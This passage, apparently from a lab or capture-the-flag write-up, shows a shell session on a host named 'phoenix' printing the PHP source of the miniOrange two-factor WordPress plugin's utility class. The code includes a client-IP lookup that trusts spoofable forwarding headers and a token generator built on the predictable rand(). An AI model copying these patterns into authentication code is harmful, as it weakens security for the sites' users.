class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br><span class="line">751</span><br><span class="line">752</span><br><span class="line">753</span><br><span class="line">754</span><br><span class="line">755</span><br><span class="line">756</span><br><span class="line">757</span><br><span class="line">758</span><br><span class="line">759</span><br><span class="line">760</span><br><span class="line">761</span><br><span class="line">762</span><br><span class="line">763</span><br><span class="line">764</span><br><span class="line">765</span><br><span class="line">766</span><br><span class="line">767</span><br><span class="line">768</span><br><span class="line">769</span><br><span class="line">770</span><br><span class="line">771</span><br><span class="line">772</span><br><span class="line">773</span><br><span class="line">774</span><br><span class="line">775</span><br><span class="line">776</span><br></pre></td><td class="code"><pre><span class="line">wp_user@phoenix:~/wordpress$ <span class="built_in">cat</span> /opt/wordpress/wp-content/plugins/miniorange-2-factor-authentication/handler/twofa/two_fa_utility.php</span><br><span class="line">&lt;?php</span><br><span class="line">/** miniOrange enables user to <span class="built_in">log</span> <span class="keyword">in</span> through mobile authentication as an additional layer of security over password.</span><br><span class="line"> * Copyright (C) 2015  miniOrange</span><br><span class="line"> *</span><br><span class="line"> * This program is free software: you can redistribute it and/or modify</span><br><span class="line"> * it under the terms of the GNU General Public License as published by</span><br><span class="line"> * the Free Software Foundation, either version 3 of the License, or</span><br><span class="line"> * (at your option) any later version.</span><br><span class="line"> *</span><br><span class="line"> * This program is distributed <span class="keyword">in</span> the hope that it will be useful,</span><br><span class="line"> * but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line"> * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line"> * GNU General Public License <span class="keyword">for</span> more details.</span><br><span class="line"> *</span><br><span class="line"> * You should have received a copy of the GNU General Public License</span><br><span class="line"> * along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;</span><br><span class="line"> * @package        miniOrange OAuth</span><br><span class="line"> * @license        http://www.gnu.org/copyleft/gpl.html GNU/GPL, see LICENSE.php</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * This library is miniOrange Authentication Service.</span><br><span class="line"> * Contains Request Calls to Customer service.</span><br><span class="line"> **/</span><br><span class="line">class MO2f_Utility &#123;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> get_hidden_phone( <span class="variable">$phone</span> ) &#123;</span><br><span class="line">                <span class="variable">$hidden_phone</span> = <span class="string">&#x27;xxxxxxx&#x27;</span> . substr( <span class="variable">$phone</span>, strlen( <span class="variable">$phone</span> ) - 3 );</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$hidden_phone</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> mo2f_check_empty_or_null( <span class="variable">$value</span> ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( ! isset( <span class="variable">$value</span> ) || <span class="variable">$value</span> == <span class="string">&#x27;&#x27;</span> ) &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> <span class="function"><span class="title">is_curl_installed</span></span>() &#123;</span><br><span class="line">                <span class="keyword">if</span> ( in_array( <span class="string">&#x27;curl&#x27;</span>, get_loaded_extensions() ) ) &#123;</span><br><span class="line">                        <span class="built_in">return</span> 1;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">return</span> 0;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> <span class="function"><span class="title">get_all_plugins_installed</span></span>() &#123;</span><br><span class="line">                <span class="variable">$all_plugins</span> = get_plugins();</span><br><span class="line">                <span class="variable">$plugins</span> = array();</span><br><span class="line">                <span class="variable">$form</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="variable">$plugins</span>[<span class="string">&quot;None&quot;</span>] = <span class="string">&quot;None&quot;</span>;</span><br><span class="line">                foreach (<span class="variable">$all_plugins</span> as <span class="variable">$plugin_name</span>=&gt;<span class="variable">$plugin_details</span>)&#123;</span><br><span class="line">                        <span class="variable">$plugins</span>[<span class="variable">$plugin_name</span>] = <span class="variable">$plugin_details</span>[<span class="string">&quot;Name&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">unset</span>(<span class="variable">$plugins</span>[<span class="string">&#x27;miniorange-2-factor-authentication/miniorange_2_factor_settings.php&#x27;</span>]);</span><br><span class="line">                <span class="variable">$form</span> .= <span class="string">&#x27;&lt;div style=&quot;padding:5px;margin-left:4%;font-size:13px;background-color: #a3e8c2&quot;&gt;Please select the plugin&lt;br&gt;</span></span><br><span class="line"><span class="string">                        &lt;select name=&quot;plugin_selected&quot;&gt;&#x27;</span>;</span><br><span class="line">                foreach(<span class="variable">$plugins</span> as <span class="variable">$identifier</span>=&gt;<span class="variable">$name</span>) &#123;</span><br><span class="line">                        <span class="variable">$form</span> .= <span class="string">&#x27;&lt;option value=&quot;&#x27;</span> . <span class="variable">$identifier</span> . <span class="string">&#x27;&quot;&gt;&#x27;</span> .  <span class="variable">$name</span> . <span class="string">&#x27;&lt;/option&gt;&#x27;</span> ;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$form</span> .= <span class="string">&#x27;&lt;/select&gt;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$form</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> mo2f_check_number_length( <span class="variable">$token</span> ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( is_numeric( <span class="variable">$token</span> ) ) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( strlen( <span class="variable">$token</span> ) &gt;= 4 &amp;&amp; strlen( <span class="variable">$token</span> ) &lt;= 8 ) &#123;</span><br><span class="line">                                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> mo2f_get_hidden_email( <span class="variable">$email</span> ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( ! isset( <span class="variable">$email</span> ) || trim( <span class="variable">$email</span> ) === <span class="string">&#x27;&#x27;</span> ) &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$emailsize</span>    = strlen( <span class="variable">$email</span> );</span><br><span class="line">                <span class="variable">$partialemail</span> = substr( <span class="variable">$email</span>, 0, 1 );</span><br><span class="line">                <span class="variable">$temp</span>         = strrpos( <span class="variable">$email</span>, <span class="string">&quot;@&quot;</span> );</span><br><span class="line">                <span class="variable">$endemail</span>     = substr( <span class="variable">$email</span>, <span class="variable">$temp</span> - 1, <span class="variable">$emailsize</span> );</span><br><span class="line">                <span class="keyword">for</span> ( <span class="variable">$i</span> = 1; <span class="variable">$i</span> &lt; <span class="variable">$temp</span>; <span class="variable">$i</span> ++ ) &#123;</span><br><span class="line">                        <span class="variable">$partialemail</span> = <span class="variable">$partialemail</span> . <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$hiddenemail</span> = <span class="variable">$partialemail</span> . <span class="variable">$endemail</span>;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$hiddenemail</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> check_if_email_is_already_registered( <span class="variable">$email</span> ) &#123;</span><br><span class="line">                global <span class="variable">$Mo2fdbQueries</span>;</span><br><span class="line">                <span class="variable">$users</span> = get_users( array() );</span><br><span class="line">                foreach ( <span class="variable">$users</span> as <span class="variable">$user</span> ) &#123;</span><br><span class="line">                        <span class="variable">$user_email</span> = <span class="variable">$Mo2fdbQueries</span>-&gt;get_user_detail( <span class="string">&#x27;mo2f_user_email&#x27;</span>, <span class="variable">$user</span>-&gt;ID );</span><br><span class="line">                        <span class="keyword">if</span> ( <span class="variable">$user_email</span> == <span class="variable">$email</span> ) &#123;</span><br><span class="line">                                <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> check_if_request_is_from_mobile_device( <span class="variable">$useragent</span> ) &#123;</span><br><span class="line">                <span class="keyword">if</span> ( preg_match( <span class="string">&#x27;/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i&#x27;</span>, <span class="variable">$useragent</span> ) || preg_match( <span class="string">&#x27;/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i&#x27;</span>, substr( <span class="variable">$useragent</span>, 0, 4 ) ) ) &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> set_user_values(  <span class="variable">$user_session_id</span>, <span class="variable">$variable</span>, <span class="variable">$value</span>)&#123;</span><br><span class="line">                global <span class="variable">$Mo2fdbQueries</span>;</span><br><span class="line">                <span class="variable">$key</span> = get_option( <span class="string">&#x27;mo2f_encryption_key&#x27;</span> );</span><br><span class="line">                <span class="variable">$data_option</span>=NULL;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(empty(<span class="variable">$data_option</span>))&#123;</span><br><span class="line"></span><br><span class="line">                        //setting session</span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="variable">$variable</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">                        // setting cookie values</span><br><span class="line">                        <span class="keyword">if</span>(is_array(<span class="variable">$value</span>))&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$variable</span> == <span class="string">&#x27;mo_2_factor_kba_questions&#x27;</span>)&#123;</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;kba_question1&#x27;</span>, <span class="variable">$value</span>[0][<span class="string">&#x27;question&#x27;</span>]);</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;kba_question2&#x27;</span>, <span class="variable">$value</span>[1][<span class="string">&#x27;question&#x27;</span>] );</span><br><span class="line">                                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$variable</span> == <span class="string">&#x27;mo2f_rba_status&#x27;</span>)&#123;</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;mo2f_rba_status_status&#x27;</span>, <span class="variable">$value</span>[<span class="string">&quot;status&quot;</span>] );</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;mo2f_rba_status_sessionUuid&#x27;</span>, <span class="variable">$value</span>[<span class="string">&quot;sessionUuid&quot;</span>] );</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;mo2f_rba_status_decision_flag&#x27;</span>, <span class="variable">$value</span>[<span class="string">&quot;decision_flag&quot;</span>] );</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                MO2f_Utility::mo2f_set_cookie_values( <span class="variable">$variable</span>, <span class="variable">$value</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        // setting values <span class="keyword">in</span> database</span><br><span class="line">                        <span class="variable">$user_session_id</span> = MO2f_Utility::decrypt_data( <span class="variable">$user_session_id</span>, <span class="variable">$key</span> );</span><br><span class="line">                        <span class="keyword">if</span> ( is_array( <span class="variable">$value</span> ) ) &#123;</span><br><span class="line">                                <span class="variable">$string_value</span> = serialize( <span class="variable">$value</span> );</span><br><span class="line">                                <span class="variable">$Mo2fdbQueries</span>-&gt;save_user_login_details( <span class="variable">$user_session_id</span>, array( <span class="variable">$variable</span> =&gt; <span class="variable">$string_value</span> ) );</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="variable">$Mo2fdbQueries</span>-&gt;save_user_login_details( <span class="variable">$user_session_id</span>, array( <span class="variable">$variable</span> =&gt; <span class="variable">$value</span> ) );</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$data_option</span>) &amp;&amp; <span class="variable">$data_option</span>==<span class="string">&quot;sessions&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$_SESSION</span>[<span class="variable">$variable</span>] = <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$data_option</span>) &amp;&amp; <span class="variable">$data_option</span>==<span class="string">&quot;cookies&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span>(is_array(<span class="variable">$value</span>))&#123;</span><br><span class="line">                                <span class="keyword">if</span>(<span class="variable">$variable</span> == <span class="string">&#x27;mo_2_factor_kba_questions&#x27;</span>)&#123;</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;kba_question1&#x27;</span>, <span class="variable">$value</span>[0] );</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;kba_question2&#x27;</span>, <span class="variable">$value</span>[1] );</span><br><span class="line">                                &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$variable</span> == <span class="string">&#x27;mo2f_rba_status&#x27;</span>)&#123;</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;mo2f_rba_status_status&#x27;</span>, <span class="variable">$value</span>[<span class="string">&quot;status&quot;</span>] );</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;mo2f_rba_status_sessionUuid&#x27;</span>, <span class="variable">$value</span>[<span class="string">&quot;sessionUuid&quot;</span>] );</span><br><span class="line">                                        MO2f_Utility::mo2f_set_cookie_values( <span class="string">&#x27;mo2f_rba_status_decision_flag&#x27;</span>, <span class="variable">$value</span>[<span class="string">&quot;decision_flag&quot;</span>] );</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                                MO2f_Utility::mo2f_set_cookie_values( <span class="variable">$variable</span>, <span class="variable">$value</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!empty(<span class="variable">$data_option</span>) &amp;&amp; <span class="variable">$data_option</span>==<span class="string">&quot;tables&quot;</span>)&#123;</span><br><span class="line">                        <span class="variable">$user_session_id</span> = MO2f_Utility::decrypt_data( <span class="variable">$user_session_id</span>, <span class="variable">$key</span> );</span><br><span class="line">                        <span class="keyword">if</span> ( is_array( <span class="variable">$value</span> ) ) &#123;</span><br><span class="line">                                <span class="variable">$string_value</span> = serialize( <span class="variable">$value</span> );</span><br><span class="line">                                <span class="variable">$Mo2fdbQueries</span>-&gt;save_user_login_details( <span class="variable">$user_session_id</span>, array( <span class="variable">$variable</span> =&gt; <span class="variable">$string_value</span> ) );</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="variable">$Mo2fdbQueries</span>-&gt;save_user_login_details( <span class="variable">$user_session_id</span>, array( <span class="variable">$variable</span> =&gt; <span class="variable">$value</span> ) );</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        public static <span class="keyword">function</span> <span class="function"><span class="title">get_client_ipaddress</span></span>()&#123;</span><br><span class="line"></span><br><span class="line">                <span class="variable">$ip</span> = null;</span><br><span class="line">                <span class="keyword">if</span> (!empty(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_CLIENT_IP&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                &#125; elseif (!empty(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">                        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$ip</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        /*</span><br><span class="line"></span><br><span class="line">        Returns Random string with length provided <span class="keyword">in</span> parameter.</span><br><span class="line"></span><br><span class="line">        */</span><br><span class="line"></span><br><span class="line">        /**</span><br><span class="line">         * @param string <span class="variable">$data</span> - crypt response from Sagepay</span><br><span class="line">         *</span><br><span class="line">         * @<span class="built_in">return</span> string</span><br><span class="line">         */</span><br><span class="line">        public static <span class="keyword">function</span> decrypt_data( <span class="variable">$data</span>, <span class="variable">$key</span> ) &#123;</span><br><span class="line">                <span class="variable">$c</span> = base64_decode(<span class="variable">$data</span>);</span><br><span class="line">                <span class="variable">$ivlen</span> = openssl_cipher_iv_length(<span class="variable">$cipher</span>=<span class="string">&quot;AES-128-CBC&quot;</span>);</span><br><span class="line">                <span class="variable">$iv</span> = substr(<span class="variable">$c</span>, 0, <span class="variable">$ivlen</span>);</span><br><span class="line">                <span class="variable">$hmac</span> = substr(<span class="variable">$c</span>, <span class="variable">$ivlen</span>, <span class="variable">$sha2len</span>=32);</span><br><span class="line">                <span class="variable">$ciphertext_raw</span> = substr(<span class="variable">$c</span>, <span class="variable">$ivlen</span>+<span class="variable">$sha2len</span>);</span><br><span class="line">                <span class="variable">$original_plaintext</span> = openssl_decrypt(<span class="variable">$ciphertext_raw</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="variable">$options</span>=OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">                <span class="variable">$calcmac</span> = hash_hmac(<span class="string">&#x27;sha256&#x27;</span>, <span class="variable">$ciphertext_raw</span>, <span class="variable">$key</span>, <span class="variable">$as_binary</span>=<span class="literal">true</span>);</span><br><span class="line">                <span class="variable">$decrypted_text</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(is_string(<span class="variable">$hmac</span>) and is_string(<span class="variable">$calcmac</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">if</span> (hash_equals(<span class="variable">$hmac</span>, <span class="variable">$calcmac</span>))//PHP 5.6+ timing attack safe comparison</span><br><span class="line">                        &#123;</span><br><span class="line">                                <span class="variable">$decrypted_text</span>=<span class="variable">$original_plaintext</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$decrypted_text</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> random_str( <span class="variable">$length</span>, <span class="variable">$keyspace</span> = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span> ) &#123;</span><br><span class="line">                <span class="variable">$randomString</span>     = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="variable">$charactersLength</span> = strlen( <span class="variable">$keyspace</span> );</span><br><span class="line">                <span class="variable">$keyspace</span>         = <span class="variable">$keyspace</span> . microtime( <span class="literal">true</span> );</span><br><span class="line">                <span class="variable">$keyspace</span>         = str_shuffle( <span class="variable">$keyspace</span> );</span><br><span class="line">                <span class="keyword">for</span> ( <span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span> ++ ) &#123;</span><br><span class="line">                        <span class="variable">$randomString</span> .= <span class="variable">$keyspace</span>[ rand( 0, <span class="variable">$charactersLength</span> - 1 ) ];</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">return</span> <span class="variable">$randomString</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public static <span class="keyword">function</span> mo2f_set_transient( <span class="variable">$session_id</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$expiration</span> = 300 ) &#123;</span><br><span class="line">                set_transient(<span class="variable">$session_id</span>.<span 